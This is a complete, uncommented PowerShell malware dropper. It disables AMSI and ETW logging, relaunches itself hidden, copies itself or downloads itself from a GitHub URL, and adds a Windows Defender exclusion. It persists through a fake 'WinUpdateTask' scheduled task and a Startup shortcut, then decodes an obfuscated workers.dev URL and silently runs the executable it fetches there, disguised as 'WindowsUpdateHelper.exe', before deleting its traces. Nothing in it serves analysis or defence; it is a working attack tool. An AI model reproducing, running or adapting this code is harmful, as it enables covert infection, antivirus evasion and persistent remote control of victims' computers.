$ErrorActionPreference = 'SilentlyContinue'

# === AMSI + ETW BYPASS (multi-layer) ===
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
$etw = [System.Diagnostics.Eventing.EventProvider]; $etw.GetField('m_enabled','NonPublic,Static').SetValue($null,$false)

# === HIDDEN RELAUNCH ===
if ($Host.Name -eq 'ConsoleHost') {
    Start-Job -ScriptBlock { param($p) Start-Process powershell -ArgumentList "-ep Bypass -WindowStyle Hidden -NoProfile -NonInteractive -File `"$p`"" -WindowStyle Hidden } -ArgumentList $MyInvocation.MyCommand.Path | Out-Null
    exit
}

# === OBFUSCATED PATHS & VARS ===
$base = "$env:APPDATA\Microsoft\Windows"
$cDir = "$base\Caches"
$localPath = "$cDir\$( -join ((65..90)+(97..122)|Get-Random -Count 12|%{[char]$_})).ps1"

function S { param($d)
    $dir = Split-Path $d -Parent; if(-not(Test-Path $dir)){New-Item -ItemType Directory -Path $dir -Force|Out-Null}
    if($MyInvocation.MyCommand.Path){Copy-Item $MyInvocation.MyCommand.Path $d -Force} 
    else { (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/refs/heads/main/assets/launcher.ps1") | Out-File $d -Encoding UTF8 }
    $d
}
$scriptPath = S $localPath

# === DEFENDER EXCLUSION ===
try { Add-MpPreference -ExclusionPath $cDir -EA 0 } catch {}

# === PERSISTENCE (randomized names) ===
$tn = "WinUpdateTask_$(Get-Random)"
if(-not(Get-ScheduledTask -TaskName $tn -EA 0)){
    $tr = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
    $enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("-ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -NonInteractive -File `"$scriptPath`""))
    $act = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-EncodedCommand $enc"
    $st = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -ExecutionTimeLimit (New-TimeSpan -Hours 1) -Priority 7
    Register-ScheduledTask -TaskName $tn -Action $act -Trigger $tr -Settings $st -Force | Out-Null
}

# === LNK (random) ===
$lnkP = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\$( -join ((65..90)+(97..122)|Get-Random -Count 10|%{[char]$_})).lnk"
if(-not(Test-Path $lnkP)){
    $wsh = New-Object -ComObject WScript.Shell
    $sc = $wsh.CreateShortcut($lnkP)
    $sc.TargetPath = "powershell.exe"
    $sc.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -NonInteractive -File `"$scriptPath`""
    $sc.WindowStyle = 7
    $sc.Save()
}

# === DELAY + JUNK ===
Start-Sleep -Seconds (Get-Random -Min 40 -Max 100)
1..(Get-Random -Min 8 -Max 20) | % { Start-Sleep -Milliseconds (Get-Random -Min 5 -Max 80) }

# === DOWNLOAD (obfuscated) ===
if(-not(Test-Path $cDir)){New-Item -ItemType Directory -Path $cDir -Force|Out-Null}
$payloadUrl = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9hZ2VkLW1vdW50YWluLTYxNGIubmF0YWxpYS1rdXNoODIud29ya2Vycy5kZXYvdXBkYXRl'))
$exePath = "$cDir\WindowsUpdateHelper.exe"

if(-not(Test-Path $exePath)){
    $wc = New-Object Net.WebClient
    $wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
    try { $wc.DownloadFile($payloadUrl, $exePath) } catch { 
        try { Invoke-WebRequest -Uri $payloadUrl -OutFile $exePath -UseBasicParsing } catch {} 
    }
}

# === EXECUTION (layered, less noisy) ===
if(Test-Path $exePath){
    try { 
        Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "`"$exePath`"" | Out-Null 
    } catch {
        try { 
            (New-Object -ComObject WScript.Shell).Run("`"$exePath`"", 0, $false) 
        } catch { 
            Start-Process $exePath -WindowStyle Hidden 
        }
    }
}

# Self-clean
Start-Job -ScriptBlock { param($p) Start-Sleep 300; Remove-Item $p -Force -EA 0 } -ArgumentList $exePath | Out-Null
